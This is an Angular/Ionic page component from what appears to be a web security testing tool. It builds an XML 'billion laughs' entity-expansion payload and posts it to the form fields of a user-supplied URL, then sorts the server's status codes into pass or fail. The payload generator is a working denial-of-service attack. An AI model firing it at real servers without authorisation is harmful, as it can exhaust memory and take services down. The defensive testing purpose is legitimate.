import { Component, OnInit } from '@angular/core';
import { MenuController, NavController, AlertController } from '@ionic/angular';
import { CookieService } from 'ngx-cookie-service';
import { DataManagement } from 'src/app/services/dataManagement';
import { Request } from 'src/app/app.data.model';
import { HttpParams } from '@angular/common/http';
import { Router } from '@angular/router';
import { TranslateService } from '@ngx-translate/core';

@Component({
  selector: 'app-test3',
  templateUrl: './test3.page.html',
  styleUrls: ['./test3.page.scss'],
})
export class Test3Page implements OnInit {

  option: string;
  hayForm: boolean = false;
  constructor(public menuCtrl: MenuController,
    private cookieService: CookieService,
    public dM: DataManagement,
    public navCtrl: NavController,
    public alertController: AlertController,
    private router: Router,
    private translate: TranslateService) {

  }

  ngOnInit() {
    if (this.cookieService.get('form')) {
      this.hayForm = true;
    }
  }

  //Ejecución del test
  runTest() {

    let tenRep = [1, 2, 3, 4, 5, 6, 7, 8, 9];
    let twentyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19];
    let thertyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29];
    let repeticiones = [];
    if (this.option === 'diez') {
      repeticiones = tenRep;
    }
    if (this.option === 'veinte') {
      repeticiones = twentyRep;
    }
    if (this.option === 'treinta') {
      repeticiones = thertyRep;
    }

    let test: string = '<?XML version="1.0"?> <!DOCTYPE lolz [ <!ELEMENT lolz (#PCDATA)> <!ENTITY lol "lol"> ';

    for (let entry1 of repeticiones) {
      test = test + '<!ENTITY lol' + entry1 + ' "';
      for (let entry2 of repeticiones) {
        if (entry1 === 1) {
          test = test + '&lol;';
        } else {
          let numero: number = entry1 - 1;
          test = test + '&lol' + numero + ';';
        }
      }
      test = test + '">';
    }

    test = test + ']> <lolz>&lol9;</lolz>';


    let fd = new HttpParams();
    let form: Request;
    form = JSON.parse(this.cookieService.get('form'));
    let url = form.url;
    for (let entry of form.attributes) {
      if (entry.type === 'none') {
        fd = fd.append(entry.name, entry.value);
      } else {
        fd = fd.append(entry.name, test);
      }
    }

    this.dM
      .runTest(url, fd)
      .then(data => {
        let status: string = data.status;
        console.log("Status: " + status);
        this.router.navigate(['/negative', 3, status]);
      })
      .catch(error => {
        const translationAlertStatus: string = this.translate.instant(
          'TESTS.STATUS'
        );

        switch (error.status) {
          case 400 || 422: {
            this.router.navigate(['/positive', error.status]);
            break;
          }
          case 500 || 502 || 503 || 504: {
            const translationAlertErrorServer: string = this.translate.instant(
              'TESTS.ERROR_SERVER'
            );
            this.alertController
              .create({
                header: translationAlertErrorServer,
                subHeader: translationAlertStatus,
                message: error.status,
                buttons: ['OK']
              }).then(alertEl => {
                alertEl.present();
              });
            break;
          }
          case 404: {
            const translationAlertErrorRequest: string = this.translate.instant(
              'TESTS.ERROR_REQUEST'
            );
            this.alertController
              .create({
                header: translationAlertErrorRequest,
                subHeader: translationAlertStatus,
                message: error.status,
                buttons: ['OK']
              }).then(alertEl => {
                alertEl.present();
              });
            break;
          }
          case 429: {
            const translationAlertErrorRequests: string = this.translate.instant(
              'TESTS.ERROR_REQUESTS'
            );
            this.alertController
              .create({
                header: translationAlertErrorRequests,
                subHeader: translationAlertStatus,
                message: error.status,
                buttons: ['OK']
              }).then(alertEl => {
                alertEl.present();
              });
            break;
          }
          case 408: {
            const translationAlertErrorTime: string = this.translate.instant(
              'TESTS.ERROR_TIME'
            );
            this.alertController
              .create({
                header: translationAlertErrorTime,
                subHeader: translationAlertStatus,
                message: error.status,
                buttons: ['OK']
              }).then(alertEl => {
                alertEl.present();
              });
            break;
          }
          default: {
            const translationAlertError: string = this.translate.instant(
              'TESTS.ERROR'
            );
            this.alertController
              .create({
                header: translationAlertError,
                buttons: ['OK']
              }).then(alertEl => {
                alertEl.present();
              });
            break;
          }
        }
      });
  }

  //Cambiar el idioma
  changeLanguage(selectedValue: { detail: { value: string } }) {
    this.cookieService.set('lang', selectedValue.detail.value);
    this.translate.use(selectedValue.detail.value);
  }

}
